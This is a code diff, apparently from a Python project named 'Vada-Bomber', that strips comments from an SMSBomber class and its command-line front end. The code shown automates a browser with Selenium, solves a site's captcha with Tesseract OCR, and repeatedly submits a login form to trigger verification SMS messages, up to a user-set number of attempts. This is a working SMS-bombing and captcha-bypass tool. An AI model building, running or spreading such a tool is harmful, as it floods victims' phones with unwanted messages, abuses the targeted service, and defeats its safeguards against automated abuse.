@@ -17,20 +17,16 @@ from rich.progress import Progress, BarColumn, TextColumn, TimeElapsedColumn, Ti
 from rich.table import Table
 from rich.text import Text
 
-# Ignore unnecessary warnings
 warnings.filterwarnings("ignore", category=DeprecationWarning)
 
-# --- Key function to find resource paths in a packaged state ---
 def resource_path(relative_path):
     """ Get absolute path to resource, works for dev and for PyInstaller """
     try:
-        # PyInstaller creates a temp folder and stores its path in _MEIPASS
         base_path = sys._MEIPASS
     except Exception:
         base_path = os.path.abspath(".")
     return os.path.join(base_path, relative_path)
 
-# ----------------------------------------------------------------
 
 class SMSBomber:
     def __init__(self, vadana_url):
@@ -45,7 +41,6 @@ class SMSBomber:
         self.driver = None
         self.vadana_url = vadana_url
         
-        # Set Tesseract path for the entire class
         pytesseract.pytesseract.tesseract_cmd = resource_path('tesseract')
 
     def start_driver(self):
@@ -55,7 +50,6 @@ class SMSBomber:
                 self.driver = webdriver.Chrome(service=service, options=self.chrome_options)
                 self.driver.set_page_load_timeout(10)
             except Exception:
-                # If the driver fails to start, return an error message
                 return "[bold red]Error: WebDriver could not be started.[/bold red]"
         return None
 
@@ -63,7 +57,6 @@ class SMSBomber:
         if self.driver is not None:
             self.driver.quit()
             self.driver = None
-        # Clean up temporary files
         for file in ["full_screenshot.png", "captcha_image.png"]:
             if os.path.exists(file):
                 try:
@@ -103,16 +96,11 @@ class SMSBomber:
                 self.driver.find_element(By.NAME, "captcha").send_keys(captcha_text)
             
             self.driver.find_element(By.ID, "loginBtn").click()
-            # Increased wait time for the response to fully load
             time.sleep(1.5) 
-
-            # --- Key part: Check for the success element ---
             try:
                 self.driver.find_element(By.XPATH, "//div[@id='login-alert-section']/div[contains(@class, 'alert-success')]")
-                # If the element above is found, it means the SMS was sent
                 return True, "[bold green]Success![/bold green] Verification code sent."
             except NoSuchElementException:
-                # If the success element is not found, we look for an error
                 try:
                     error_element = self.driver.find_element(By.XPATH, "//div[contains(@class, 'alert-danger')]")
                     error_text = error_element.text
@@ -123,13 +111,11 @@ class SMSBomber:
                     else:
                         return False, "[bold red]Failed:[/bold red] Unknown error from site."
                 except NoSuchElementException:
-                    # If there's neither a success nor an error message, something unknown happened
                     return False, "[yellow]Unknown response from server.[/yellow]"
 
         except TimeoutException:
             return False, "[bold red]Error:[/bold red] Page failed to load. Check URL/connection."
         except Exception:
-            # Display a generic error instead of a technical one
             return False, "[bold red]Error:[/bold red] An unexpected error occurred."
 
 
@@ -166,13 +152,11 @@ def main():
     log_messages = []
 
     def add_log(message):
-        # Max number of logs to display
         max_logs = 5 
         log_messages.append(f"[[dim]{time.strftime('%H:%M:%S')}[/dim]] {message}")
         if len(log_messages) > max_logs:
             log_messages.pop(0)
 
-    # --- Get user input ---
     console.print("[bold magenta]\n===== Vada-Bomber =====[/bold magenta]")
     console.print("[yellow][*] Press Ctrl+C to stop[/yellow]")
     
@@ -183,7 +167,6 @@ def main():
     except ValueError:
         max_attempts = 100
 
-    # --- Clear the screen and display the banner ---
     os.system('cls' if os.name == 'nt' else 'clear')
     
     # --- ASCII Banner ---
